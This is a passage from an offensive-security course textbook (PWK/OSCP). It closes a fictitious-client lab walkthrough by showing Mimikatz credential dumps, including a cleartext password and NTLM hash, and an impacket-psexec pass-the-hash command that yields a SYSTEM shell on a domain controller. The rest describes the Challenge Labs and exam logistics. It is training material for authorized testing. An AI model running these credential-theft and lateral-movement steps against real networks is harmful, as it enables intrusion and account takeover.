1211 (Github, 2022). https://github.com/gentilkiwi/mimikatz/releases
1212 (Microsoft Learn, 2022), https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-
programs
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 859
Made in Morocco
Penetration Testing with Kali Linux
SID : S-1-5-21-1104084343-2915547075-2081307249-1108
msv :
[00000003] Primary
* Username : beccy
* Domain : BEYOND
* NTLM : f0397ec5af49971f6efbdb07877046b3
* SHA1 : 2d878614fb421517452fd99a3e2c52dee443c8cc
* DPAPI : 4aea2aa4fa4955d5093d5f14aa007c56
tspkg :
wdigest :
* Username : beccy
* Domain : BEYOND
* Password : (null)
kerberos :
* Username : beccy
* Domain : BEYOND.COM y
* Password : NiftyTopekaDevolve6655!#!
...
Listing 944 - Extracting the credentials for beccyk with Mimikatz
Great! We successfully extracted the clear text password and NTLM hash of the domain
s
administrator beccy. Let’s store both of them together with the username in creds.txt on our Kali
system.
o
Armed with these credentials, we can now take the last step of the penetration test: accessing the
domain controller. We’ll do this in the next section.
n
24.6.2 Lateral Movement
i
In this section, we’ll leverage the domain admin privileges for beccy to get access to the domain
z
controller and therefore, achieve the second goal of the penetration test.
Because we’ve obtained theD clear text password and NTLM hash for beccy, we can use impacket-
psexec to get an interactive shell on DCSRV1. While we could use either of them, let’s use the
NTLM hash. Once we have a command line shell, we confirm that we have privileged access on
DCSRV1 (172.16.6.240).
kali@kali:~$ proxychains -q impacket-psexec -hashes
00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 PI:EMAIL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 172.16.6.240.....
[*] Found writable share ADMIN$
[*] Uploading file CGOrpfCz.exe
[*] Opening SVCManager on 172.16.6.240.....
[*] Creating service tahE on 172.16.6.240.....
[*] Starting service tahE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 860
Made in Morocco
Penetration Testing with Kali Linux
C:\Windows\system32> hostname
DCSRV1
C:\Windows\system32> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 172.16.6.240
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 172.16.6.254
Listing 945 - Using psexec to get an interactive shell
y
Nice! Listing 945 shows that we achieved all goals of the penetration test by obtaining domain
administrator privileges and accessing the domain controller.
k
24.7 Wrapping Up
s
In this Module, we performed a penetration test for the fictitious client BEYOND Finances. The
goals set by the client were to gain access to the internal network, obtain domain Administrator
o
privileges, and access the domain controller.
Once we managed to get an initial footholdn in the internal network, we performed Kerberoasting
to obtain the credentials of a domain user. With this account, we could log in to a WordPress
instance and abuse a plugin to authenticate to our Kali machine. We then relayed the
i
authentication request to another machine and obtained code execution as NT
z
AUTHORITY\SYSTEM. Armed with administrative privileges, we extracted the credentials of a
domain Admin account. Then, we successfully accessed the domain controller.
D
We cannot emphasize enough to take detailed notes throughout a real penetration test and keep
a good log of when certain actions were performed. After a penetration test, we must ensure that
we leave everything the way it was. Any exploits or artifacts must be removed or, at the very least,
the client should be notified about their location.
At the end of this Module, let’s talk about some of the key takeaways of this penetration test. One
of the most important lessons of this Module (and the whole course) is to always conduct
thorough enumeration. We cannot attack what we missed and therefore we should make sure to
always map out the entire attack surface of all accessible machines and services within the
scope of an assessment.
Another important takeaway is that we should never skip or cut short the enumeration process to
chase a quick win. We may miss crucial information, potentially leading to a much more
promising attack vector.
Next, once we have obtained administrative privileges on a target system, we should not jump
straight to the next machine. Armed with these privileges, we can examine areas of the system
that may have been previously inaccessible.
Finally, let’s discuss how we should work with gathered information such as enumeration results.
It is crucial that we learn to combine information found on different systems and stages of a
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 861
Made in Morocco
Penetration Testing with Kali Linux
penetration test. We may find information on a machine that we cannot leverage at the current
stage, but only later on in the assessment. Detailed note taking is essential to not lose track of all
the gathered information.
Taking these key takeaways into consideration will be tremendously valuable not only in the
Challenge Labs, but also in real assessments.
y
k
s
o
n
i
z
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 862
Made in Morocco
Penetration Testing with Kali Linux
25 Trying Harder: The Challenge Labs
In this final Learning Module, we will discuss the transition from going through the course
material and Module exercises to taking on the Challenge Labs. We will cover the following
Learning Units:
• PWK Challenge Lab Overview
• Challenge Lab Details
• The OSCP Exam Information
25.1 PWK Challenge Lab Overview
y
This Learning Unit covers the following Learning Objectives:
• Learn about the different kinds of Challenge Labs k
• Obtain a high level overview of each scenario
s
• Understand how to treat the mock OSCP Challenge Labs
25.1.1 STOP! Do This First o
If you are reading this Module and haven’t yet completed ALL the PWK Capstone exercises, we
n
highly recommend going back and finishing them before proceeding. The Capstone exercises
provide you with an opportunity to hack machines with specific constraints on what needs to be
enumerated. By compromising singlie machines and smaller networks via the Capstone exercises,
you will set yourself up for a mzore successful, effective, and pleasant experience with the
Challenge Labs.
D
Once you have completed the Capstone exercises, make sure to read through and follow along
with the Assembling the Pieces Module to begin developing a methodological framework for
attacking larger networks. We recommend starting with the Challenge Labs only once the
Capstone exercises and the Assembling the Pieces Module are complete.
25.1.2 Challenge Labs 1-3
Much of the below information is included in the Introduction to PWK Module. We’re repeating the
information here because it has likely been a while since you read the introduction. Please review
it carefully before starting the Challenge Labs.
There are two types of Challenge Labs. The first three are called scenarios. Each scenario
consists of a set of networked machines and a short background story that puts those machines
in context. Your goal is to obtain access to a Domain Administrator account on an Active
Directory domain, and compromise as many machines on the network as possible.
In the same way that Capstone Exercises test the learner on the material of multiple Learning
Units, so too do these scenarios test the learner on the material of multiple Learning Modules.
Your level of uncertainty about the network here is high and similar to real-world penetration tests,
because you will not know which machines are vulnerable to what types of attacks. In addition,
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 863
Made in Morocco
Penetration Testing with Kali Linux
each of the three scenarios progressively increases in complexity due to additional machines,
subnetworks, and attack vectors.
Further, you will not know that any specific machine is directly vulnerable in the first place. Some
machines will be dependent on information, credentials, or capabilities that will be found on other
machines. And some machines may not even be (intentionally) exploitable until after the Domain
Controller is compromised.
All machines contain either a local.txt file, a proof.txt file, or both. The contents of these files are
randomized hashes that can be submitted to the OLP to log each compromise. Just like the
Module exercise flags, the contents of these files will change on every revert of the machine.
The following summaries provide a high level overview of each scenario:
Challenge Lab 1: MEDTECH: You have been tasked to conduct a penetration test for MEDTECH, a
y
recently formed IoT healthcare startup. Your objective is to find as many vulnerabilities and
misconfigurations as possible in order to increase their Active Directory security posture and
reduce the attack surface. k
Challenge Lab 2: RELIA: You are tasked with a penetration test of RELIA, an industrial company
s
building driving systems for the timber industry. The target got attacked a few weeks ago and
now wants to get an assessment of their IT security. Their goal is to find out if an attacker can
breach the perimeter and get Domain Admin privileoges in the internal network.
Challenge Lab 3: SKYLARK: Skylark Industries is an aerospace multinational corporation that
n
performs research & development on cutting-edge aviation technologies. One of their major
branch offices has recently been targeted by an Advanced Persistent Threat (APT) actor
ransomware attack. For this reasoin, the company CISO now wishes to further shield Skylark
Industries’ attack surface. You zhave been tasked to conduct a preemptive penetration test
towards their HQ infrastructure and find any vulnerability that could potentially jeopardize the
company’s trade secrets.
D
Please note that Challenge 3 is significantly more difficult than Challenges 1 & 2.
It requires a substantial amount of pivoting, tunneling, looking for information on
multiple targets and paying close attention to post-exploitation. It is beyond the
scope of the OSCP exam. If preparing for the exam is your main objective, you
may wish to work through Challenges 4, 5 & 6 before returning Challenge 3.
25.1.3 Challenge Labs 4-6
The second type of Challenge Lab consists of an OSCP-like experience. They are each composed
of six OSCP machines. The intention of these Challenges is to provide a mock-exam experience
that closely reflects a similar level of difficulty to that of the actual OSCP exam.
Each challenge contains three machines that are connected via Active Directory, and three
standalone machines that do not have any dependencies or intranet connections. All the
standalone machines have a local.txt and a proof.txt.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 864
Made in Morocco
Penetration Testing with Kali Linux
While the Challenge Labs have no point values, on the exam the standalone machines would be
worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all
together, and the entire domain must be compromised to achieve any points for it at all.
All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are
leveraged in the first three Challenge Labs. However, the specific requirements to trigger the
vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course
material. You are expected to be able to take the demonstrated exploitation techniques and
modify them for the specific environment.
When completing Challenges 4-6, we recommend a different approach compared to Challenges
1-3. In particular, the purpose of these challenges is to provide you with direct, intuitive insight on
the types of machines that are likely to be on the exam. These Challenges are not designed to be
all-encompassing: not every vector that is part of these Challenges will be on every exam attempt,
and the exam may contain vectors that are not part of these Challeynges. Again, anything taught
within PWK is fair game.
k
In order to mimic the exam as closely as possible, we suggest that you avoid discussing these
machines in particular with peers and the Student Mentors. In addition, you may want to
experiment with setting a timer to complete these msachines. However, we don’t necessarily
recommend trying to do so within 24 hours, simply because it is more effective to spread out your
learning time over a longer period. For each of theo challenges, you might want to try spending an
initial 24 hours in total to see how far you can get within the time limit. Then, step back and
explore your progress.
n
In a sense, Challenges 4-6 provide a self-assessment of yourself as much as they represent an
assessment of machines and networks. We recommend that you treat them as an opportunity to
i
discover your own strengths and weaknesses, and then to use that information to guide your next
z
learning focus.
25.2 Challenge LabD Details
In this Learning Unit we will discuss some of the important details that are useful to know about
the Challenge Labs. This Learning Unit covers the following Learning Objectives:
• Understand how Client-Side simulations work
• Understand the concept of dependencies
• Learn about non-intentionally vulnerable machines
• Understand the lack of meaning inherent to IP address ordering
• Learn how routers and Network Address Translation affect the scenarios
• Understand how to treat credentials and password attacks
25.2.1 Client-Side Simulations
The internal VPN lab network contains a number of simulated clients that can be exploited using
client-side attacks. These clients are programmed to simulate common corporate user activity.
Subtle hints throughout the lab can help you locate these simulated clients. Thorough post-
exploitation information gathering may also reveal communication between client machines.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 865
Made in Morocco
Penetration Testing with Kali Linux
The various simulated clients will perform their task(s) at different time intervals. The most
common interval is three minutes.
25.2.2 Machine Dependencies
Some targets are not designed to be exploited without first gathering specific additional
information on another lab machine. Others can only be exploited through a pivot. Student
Mentors will not provide details about machine dependencies. Determining whether or not a
machine has a dependency is an important part of the information gathering process, so you’ll
need to discover this information on your own.
An example of a dependency might be that a machine named VANGUARD contains a file that
divulges credentials for another machine named SENTINEL. VANGUARD may not have any
(intentional) external attack vectors, so you will need to compromise SENTINEL first.
y
Note that these two specific machine names don’t exiskt in any of the Challenge
Labs, they are just mentioned here by way of example.
s
There are no dependencies between Challenges. This means that the information you find in
o
Challenge 1 will not pertain to any of the machines in Challenges 2-6, and so on.
For the OSCP-like Challenges (4-6), there are no dependencies between the three domain joined
n
machines and the three standalone machines. The three standalone machines themselves also
do not contain any dependencies. Thus one way to think about these Challenges (and therefore
the exam) is that each contains a tiotal of four isolated mini-environments: an AD set and three
standalone machines. z
25.2.3 Machine Vulnerability
D
While some machines may be dependent on information or access that can only be obtained by
compromising other machines within a Challenge, some machines aren’t designed to be hacked
at all. The reason these machines exist in the Challenges is because in the real world, many
machines you will encounter as a penetration tester will not be (easily) hackable.
However, the number of these machines is kept to a minimum; there are only a few per challenge.
In addition, every machine does contain at least a local.txt or proof.txt file. This means that some
machines may not have privilege escalation paths, but every machine can be accessed after
obtaining Domain Administrator permissions for each of the Challenges (whether or not they are
domain joined).
It is important to note that the OSCP-like Challenges and the OSCP itself DO NOT contain these
types of machines. On the exam, every machine is designed to be exploitable, and every machine
has a privilege escalation attack vector.
25.2.4 Machine Ordering
The IP addresses of the lab machines are not significant. For example, you do not need to start
with 10.11.1.1 and work your way through the machines in numerical order. One of the most
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 866
Made in Morocco
Penetration Testing with Kali Linux
important skills you will need to learn as a penetration tester is how to scan a number of
machines in order to find the lowest-hanging fruit.
Do not read into the specific octet values of the IP addresses within a challenge. If SENTINEL has
an IP address of 192.168.1.5 and VANGUARD has an IP address of 192.168.1.12, it doesn’t mean
that you should target SENTINEL first. It also doesn’t mean that SENTINEL is considered easier,
and it doesn’t mean that VANGUARD is dependent on SENTINEL. In fact, in our hypothetical
example, precisely the opposite is true!
25.2.5 Routers/NAT
Each of the Challenges have multiple subnetworks, with at least one external and one internal
subnetwork. For each Challenge, the internal subnetworks are not directly routable from the initial
external network, but the external network is routable from all other networks.
y
You will need to use various techniques covered in the course to gain access to the internal
networks. For example, you may need to exploit machines NAT’d behind firewalls, leveraging
k
dual-homed hosts or client-side exploits. Lengthy attacks such as brute forcing or DOS/DDOS are
highly discouraged as they will render the firewalls, along with any additional networks connected
to them, inaccessible to you. s
A number of machines in the labs have software firewalls enabled and may not respond to ICMP
o
echo requests. If an IP address does not respond to ICMP echo requests, this does not
necessarily mean that the target machine is down or does not exist.
n
25.2.6 Passwords
Spending an excessive amount ofi time cracking the root or administrator passwords of all
machines in the lab is not requirezd. If you have tried all of the available wordlists in Kali, and used
information gathered throughout the labs, stop and consider a different attack vector. If you have
significant cracking hardwaDre, then feel free to continue on to crack as many passwords as you
can. With “regular” hardware, every intentional vector that relies on password-cracking should
take less than 10 minutes with the right wordlist and parameters.
25.3 The OSCP Exam Information
This Learning Unit covers the following Learning Objectives:
• Learn about the OSCP Certification Exam
25.3.1 OSCP Exam Attempt
Included with your initial purchase of the PWK course is an attempt at the OSCP certification
exam.1213 The exam is optional, so it is up to you to decide whether or not you would like to tackle
it.
1213 (OffSec, 2023), https://help.offensive-security.com/hc/en-us/categories/360002666252-General-Frequently-Asked-Questions-
FAQs-
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 867
Made in Morocco
Penetration Testing with Kali Linux
To book your OSCP exam, go to your exam scheduling calendar. The calendar can be located in
the OffSec Training Library under the course exam page. Here you will be able to see your exam
expiry date, as well as schedule the exam for your preferred date and time.
Keep in mind that you won’t be able to select a start time if the exam labs are full for that time
period so we encourage you to schedule your exam as soon as possible.
For additional information, please visit our support page.1214
25.3.2 About the OSCP Exam
The OSCP certification exam simulates a live network in a private VPN that contains a small
number of vulnerable machines. The structure is exactly the same as that of Challenges 4-6. To
pass, you must score 70 points. Points are awarded for low-privilege command-line shell access
as well as full system compromise. The environment is completely dedicated to you for the
y
duration of the exam, and you will have 23 hours and 45 minutes to complete it.
Specific instructions for each target machine will be located ink your exam control panel, which will
only become available to you once your exam begins.
s
To ensure the integrity of our certifications, the exam will be remotely proctored. You are required
to be present 15 minutes before your exam start time to perform identity verification and other
o
pre-exam tasks. In order to do so, click on the Exam tab in the OffSec Training Library, which is
situated at the top right of your screen. During these pre-exam verification steps, you will be
provided with a VPN connectivity pack.
n
Once the exam has ended, you will have an additional 24 hours to put together your exam report
and document your findings. You wiill be evaluated on the quality and content of the exam report,
so please include as much detail azs possible and make sure your findings are all reproducible.
Once your exam files have been accepted, your exam will be graded and you will receive your
D
results in 10 business days. If you came up short, then we will notify you, and you may purchase a
certification retake using the appropriate links.
We highly recommend that you carefully schedule your exam for a 48-hour window when you can
ensure minimal outside distractions or commitments. Also, please note that exam availability is
handled on a first come, first served basis, so it is best to schedule your exam as far in advance
as possible to ensure your preferred date is available. For additional information regarding the
exam, we encourage you to take some time to go over the OSCP exam guide.1215
25.3.3 Metasploit Usage - Challenge Labs vs Exam
We encourage you to use Metasploit in the Challenge Labs, especially in Challenges 1-3.
Metasploit is a great tool and you should learn all of the features it has to offer. While Metasploit
usage is limited in the OSCP certification exam, we will encourage you not to place arbitrary
restrictions on yourself during the learning process. If you wish, you can experiment with limiting
yourself temporarily in your initial explorations of Challenges 4-6. More information about
Metasploit usage can be found in the OSCP exam guide.
1214 (OffSec, 2023), https://help.offensive-security.com/
1215 (OffSec, 2023), https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 868
Made in Morocco
Penetration Testing with Kali Linux
25.4 Wrapping Up
If you’ve taken the time to understand the course material presented in the course Modules and
associated videos and have tackled all the Module exercises and Assembling the Pieces, you’ll
enjoy the Challenge Labs. If you’re having trouble, consider filling in knowledge gaps in the course
material, and if you’re still stuck, step back and take on new perspective. It’s easy to get so fixated
on a single challenge and lose sight of the fact that there may be a simpler solution waiting down
a different path. Take good notes and review them often. Search for alternate paths that might
advance your assessment. When all else fails, do not hesitate to reach out to the Student
Mentors. Finally, remember that you often have all the knowledge you need to tackle the problem
in front of you. Don’t give up, and remember the Try Harder mindset!
y
k
s
o
n
i
z
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 869
Made in Morocco